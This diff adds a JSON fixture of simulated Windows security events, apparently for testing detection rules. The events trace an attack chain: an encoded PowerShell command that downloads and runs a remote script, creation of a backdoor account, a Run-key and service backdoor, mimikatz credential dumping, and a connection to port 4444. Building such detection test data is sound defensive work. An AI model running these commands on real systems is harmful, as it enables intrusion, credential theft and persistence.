@@ -1,0 +1,151 @@
+[
+  {
+    "timestamp": "2025-09-08T12:52:00Z",
+    "host": "WORKSTATION-01",
+    "fields": {
+      "EventID": "1",
+      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "CommandLine": "powershell.exe -EncodedCommand SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4AMQAwAC8AcwBoAGUAbABsAC4AcABzADEAJwApAA==",
+      "ProcessId": "4567",
+      "ParentProcessId": "1234",
+      "User": "WORKSTATION-01\\admin",
+      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+      "Category": "process_creation",
+      "Product": "windows"
+    }
+  },
+  {
+    "timestamp": "2025-09-08T12:53:00Z",
+    "host": "WORKSTATION-01", 
+    "fields": {
+      "EventID": "1",
+      "Image": "C:\\Windows\\System32\\net.exe",
+      "CommandLine": "net user hacker Password123! /add",
+      "ProcessId": "5678",
+      "ParentProcessId": "4567",
+      "User": "WORKSTATION-01\\admin",
+      "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "Category": "process_creation",
+      "Product": "windows"
+    }
+  },
+  {
+    "timestamp": "2025-09-08T12:54:00Z",
+    "host": "WORKSTATION-01",
+    "fields": {
+      "EventID": "1", 
+      "Image": "C:\\Windows\\System32\\whoami.exe",
+      "CommandLine": "whoami /priv",
+      "ProcessId": "6789",
+      "ParentProcessId": "4567",
+      "User": "WORKSTATION-01\\admin",
+      "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "Category": "process_creation",
+      "Product": "windows"
+    }
+  },
+  {
+    "timestamp": "2025-09-08T12:55:00Z",
+    "host": "WORKSTATION-01",
+    "fields": {
+      "EventID": "1",
+      "Image": "C:\\Windows\\System32\\reg.exe",
+      "CommandLine": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d C:\\temp\\backdoor.exe",
+      "ProcessId": "7890",
+      "ParentProcessId": "4567", 
+      "User": "WORKSTATION-01\\admin",
+      "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "Category": "process_creation",
+      "Product": "windows"
+    }
+  },
+  {
+    "timestamp": "2025-09-08T12:56:00Z",
+    "host": "WORKSTATION-01",
+    "fields": {
+      "EventID": "1",
+      "Image": "C:\\Windows\\System32\\tasklist.exe",
+      "CommandLine": "tasklist /svc",
+      "ProcessId": "8901",
+      "ParentProcessId": "4567",
+      "User": "WORKSTATION-01\\admin", 
+      "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "Category": "process_creation",
+      "Product": "windows"
+    }
+  },
+  {
+    "timestamp": "2025-09-08T12:57:00Z",
+    "host": "WORKSTATION-01",
+    "fields": {
+      "EventID": "1",
+      "Image": "C:\\Windows\\System32\\netstat.exe", 
+      "CommandLine": "netstat -an",
+      "ProcessId": "9012",
+      "ParentProcessId": "4567",
+      "User": "WORKSTATION-01\\admin",
+      "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "Category": "process_creation",
+      "Product": "windows"
+    }
+  },
+  {
+    "timestamp": "2025-09-08T12:58:00Z",
+    "host": "WORKSTATION-01",
+    "fields": {
+      "EventID": "3",
+      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "DestinationIp": "192.168.1.10",
+      "DestinationPort": "4444",
+      "Protocol": "tcp",
+      "ProcessId": "4567",
+      "User": "WORKSTATION-01\\admin",
+      "Category": "network_connection",
+      "Product": "windows"
+    }
+  },
+  {
+    "timestamp": "2025-09-08T12:59:00Z",
+    "host": "WORKSTATION-01",
+    "fields": {
+      "EventID": "4625",
+      "LogonType": "3",
+      "SubjectUserName": "admin",
+      "TargetUserName": "administrator",
+      "IpAddress": "192.168.1.100",
+      "WorkstationName": "ATTACKER-PC",
+      "Category": "authentication",
+      "Product": "windows"
+    }
+  },
+  {
+    "timestamp": "2025-09-08T13:00:00Z",
+    "host": "WORKSTATION-01",
+    "fields": {
+      "EventID": "1",
+      "Image": "C:\\Windows\\Temp\\mimikatz.exe",
+      "CommandLine": "mimikatz.exe sekurlsa::logonpasswords",
+      "ProcessId": "1122",
+      "ParentProcessId": "4567",
+      "User": "WORKSTATION-01\\admin",
+      "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "Category": "process_creation", 
+      "Product": "windows"
+    }
+  },
+  {
+    "timestamp": "2025-09-08T13:01:00Z",
+    "host": "WORKSTATION-01",
+    "fields": {
+      "EventID": "1",
+      "Image": "C:\\Windows\\System32\\sc.exe",
+      "CommandLine": "sc create malservice binpath= C:\\temp\\backdoor.exe start= auto",
+      "ProcessId": "2233",
+      "ParentProcessId": "4567",
+      "User": "WORKSTATION-01\\admin",
+      "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "Category": "process_creation",
+      "Product": "windows"
+    }
+  }
+]
